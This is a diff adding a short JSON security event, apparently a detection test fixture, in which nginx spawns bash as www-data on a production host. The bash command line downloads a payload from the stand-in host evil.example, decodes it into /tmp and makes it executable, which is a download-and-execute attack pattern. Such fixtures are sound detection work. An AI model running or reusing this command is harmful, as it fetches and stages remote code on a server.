@@ -1,0 +1,5 @@
+{
+  "process": {"name": "bash", "command_line": "curl http://evil.example/p | base64 -d > /tmp/p; chmod +x /tmp/p | bash", "parent": {"name": "nginx"}},
+  "user": {"name": "www-data"},
+  "host": {"name": "prod-1"}
+}
